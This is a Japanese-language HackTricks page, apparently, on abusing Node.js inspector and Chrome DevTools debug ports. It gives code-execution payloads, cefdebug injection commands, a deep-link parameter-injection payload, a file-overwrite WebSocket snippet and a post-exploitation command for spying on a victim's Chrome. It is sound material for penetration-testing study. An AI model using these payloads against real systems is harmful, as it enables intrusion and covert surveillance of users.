# Node inspector/CEF debug abuse

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## 基本情報

[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` スイッチで起動すると、Node.js プロセスはデバッグクライアントを待ち受けます。**デフォルト**では、ホストとポート **`127.0.0.1:9229`** で待ち受けます。各プロセスには **ユニーク** な **UUID** も割り当てられます。

インスペクタクライアントは、接続するためにホストアドレス、ポート、および UUID を知って指定する必要があります。完全な URL は `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` のようになります。

{% hint style="warning" %}
**デバッガーは Node.js 実行環境への完全なアクセス権を持っているため**、このポートに接続できる悪意のあるアクターは、Node.js プロセスの代わりに任意のコードを実行できる可能性があります（**潜在的な特権昇格**）。
{% endhint %}

インスペクタを起動する方法はいくつかあります：
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
インスペクトされたプロセスを開始すると、次のようなものが表示されます：
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
プロセスは、**CEF**（**Chromium Embedded Framework**）に基づいており、**デバッガ**を開くためにパラメータ `--remote-debugging-port=9222` を使用する必要があります（SSRF保護は非常に似ています）。しかし、**NodeJS** **デバッグ**セッションを付与する代わりに、[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)を使用してブラウザと通信します。これはブラウザを制御するためのインターフェースですが、直接的なRCEはありません。

デバッグされたブラウザを起動すると、次のようなものが表示されます：
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### ブラウザ、WebSocket、および同一生成元ポリシー <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

ウェブブラウザで開かれたウェブサイトは、ブラウザのセキュリティモデルの下でWebSocketおよびHTTPリクエストを行うことができます。**初期HTTP接続**は、**ユニークなデバッガセッションIDを取得するため**に必要です。**同一生成元ポリシー**は、ウェブサイトが**このHTTP接続**を行うことを**防ぎます**。 [**DNSリバインディング攻撃**](https://en.wikipedia.org/wiki/DNS\_rebinding)**に対する追加のセキュリティ**として、Node.jsは接続の**'Host'ヘッダー**が**IPアドレス**または**`localhost`**または**`localhost6`**を正確に指定していることを確認します。

{% hint style="info" %}
この**セキュリティ対策は、インスペクタを悪用してコードを実行することを防ぎます**。**HTTPリクエストを送信するだけで**（これはSSRF脆弱性を悪用して行うことができる）、実行されることはありません。
{% endhint %}

### 実行中のプロセスでインスペクタを起動する

実行中のnodejsプロセスに**SIGUSR1信号**を送信すると、**デフォルトポートでインスペクタを起動**させることができます。ただし、十分な権限が必要であるため、これにより**プロセス内の情報への特権アクセスが付与される可能性があります**が、直接的な特権昇格にはなりません。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
これはコンテナ内で便利です。なぜなら、`--inspect`で**プロセスをシャットダウンして新しいものを開始する**ことは**選択肢ではない**からです。**コンテナ**はプロセスと共に**終了**します。
{% endhint %}

### インスペクタ/デバッガに接続する

**Chromiumベースのブラウザ**に接続するには、ChromeまたはEdgeのそれぞれに対して`chrome://inspect`または`edge://inspect`のURLにアクセスできます。Configureボタンをクリックして、**ターゲットホストとポート**が正しくリストされていることを確認する必要があります。画像はリモートコード実行（RCE）の例を示しています：

![](<../../.gitbook/assets/image (674).png>)

**コマンドライン**を使用して、次のようにデバッガ/インスペクタに接続できます：
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
ツール [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) は、**ローカルで実行されているインスペクタを見つけ**、**コードを注入する**ことを可能にします。
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
注意してください、**NodeJS RCE エクスプロイトは** [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) に接続されている場合は**機能しません**（APIを確認して、興味深いことを見つける必要があります）。
{% endhint %}

## NodeJS デバッガー/インスペクターにおける RCE

{% hint style="info" %}
もしあなたがここに、[**Electron の XSS から RCE を取得する方法を探しているなら、このページを確認してください。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

Node **インスペクター** に接続できるときに **RCE** を取得する一般的な方法のいくつかは、（これは **Chrome DevTools プロトコルへの接続では機能しないようです**）を使用することです：
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

APIはここで確認できます: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
このセクションでは、私が人々がこのプロトコルを悪用するために使用した興味深いことをリストします。

### Deep Linksによるパラメータインジェクション

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)で、RhinoセキュリティはCEFに基づくアプリケーションがシステムにカスタムURI（workspaces://）を登録し、完全なURIを受け取り、そのURIから部分的に構成された設定でCEFベースのアプリケーションを起動することを発見しました。

URIパラメータはURLデコードされ、CEF基本アプリケーションを起動するために使用され、ユーザーが**`--gpu-launcher`**フラグを**コマンドライン**に**インジェクト**し、任意のものを実行できることが判明しました。

したがって、次のようなペイロード:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
calc.exeを実行します。

### ファイルの上書き

**ダウンロードしたファイルが保存されるフォルダ**を変更し、**悪意のあるコード**でアプリケーションの**ソースコード**を**上書き**するファイルをダウンロードします。
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCEと情報漏洩

この投稿によると: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) RCEを取得し、内部ページをtheriverから情報漏洩させることが可能です。

### ポストエクスプロイト

実際の環境で、**Chrome/Chromiumベースのブラウザを使用しているユーザーPCを侵害した後**、**デバッグを有効にしてデバッグポートをポートフォワード**することでChromeプロセスを起動できます。これにより、**被害者がChromeで行うすべてを検査し、機密情報を盗むことができます**。

ステルスな方法は、**すべてのChromeプロセスを終了させ**、その後何かを呼び出すことです。
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## 参考文献

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{% hint style="success" %}
AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを送信してください。**

</details>
{% endhint %}
